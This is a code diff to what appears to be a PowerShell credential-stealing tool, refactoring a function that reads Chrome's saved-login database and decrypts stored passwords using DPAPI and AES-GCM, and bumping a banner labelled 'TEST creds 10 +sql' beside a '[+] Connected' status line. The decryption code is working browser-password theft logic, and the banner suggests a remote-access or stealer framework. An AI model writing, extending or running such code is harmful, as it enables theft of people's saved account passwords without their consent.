@@ -461,37 +461,43 @@ function Get-DecryptedChromeCreds {
 
         $results = @()
         while ($reader.Read()) {
+    try {
+        $url = $reader.GetString(0)
+        $username = $reader.GetString(1)
+        $encPass = $reader["password_value"]
+        $encBytes = New-Object byte[] $encPass.Length
+        $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
+
+        if ($encBytes[0] -eq 0x01 -and $encBytes[1] -eq 0x00 -and $encBytes[2] -eq 0x00 -and $encBytes[3] -eq 0x00) {
+            $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        }
+        elseif ([System.Text.Encoding]::ASCII.GetString($encBytes[0..2]) -eq "v10") {
             try {
-                $url = $reader.GetString(0)
-                $username = $reader.GetString(1)
-                $encPass = $reader["password_value"]
-                $encBytes = New-Object byte[] $encPass.Length
-                $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
+                $nonce = $encBytes[3..14]
+                $ciphertext = $encBytes[15..($encBytes.Length - 17)]
+                $tag = $encBytes[($encBytes.Length - 16)..($encBytes.Length - 1)]
 
-                if ($encBytes[0] -eq 0x01 -and $encBytes[1] -eq 0x00 -and $encBytes[2] -eq 0x00 -and $encBytes[3] -eq 0x00) {
-                    # DPAPI (старый)
-                    $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                }
-                elseif ([System.Text.Encoding]::ASCII.GetString($encBytes[0..2]) -eq "v10") {
-                    # AES-GCM (новый)
-                    $nonce = $encBytes[3..14]
-                    $ciphertext = $encBytes[15..($encBytes.Length - 17)]
-                    $tag = $encBytes[($encBytes.Length - 16)..($encBytes.Length - 1)]
-
-                    $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
-                    $plaintextBytes = New-Object byte[] $ciphertext.Length
-                    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintextBytes)
-                    $plainText = $plaintextBytes
-                }
-                else {
-                    $plainText = "[UNKNOWN FORMAT]"
-                }
-
-                $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
+                $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
+                $plaintextBytes = New-Object byte[] $ciphertext.Length
+                $aes.Decrypt($nonce, $ciphertext, $tag, $plaintextBytes)
+                $plainText = $plaintextBytes
             } catch {
-                $results += "[!] Failed to decrypt row: $($_.Exception.Message)"
+                Output-Log "[DEBUG] AES-GCM decrypt failed: $($_.Exception.Message)"
+                continue
             }
         }
+        else {
+            Output-Log "[DEBUG] Unknown encryption format"
+            continue
+        }
+
+        $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
+    } catch {
+        $errorInfo = $_.Exception | Format-List * -Force | Out-String
+        Output-Log "[DEBUG] General decrypt error:`n$errorInfo"
+        $results += "[!] Failed to decrypt row"
+    }
+}
 
         $reader.Close()
         $conn.Close()
@@ -749,7 +755,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 9 +sql
+                                            TEST creds 10 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
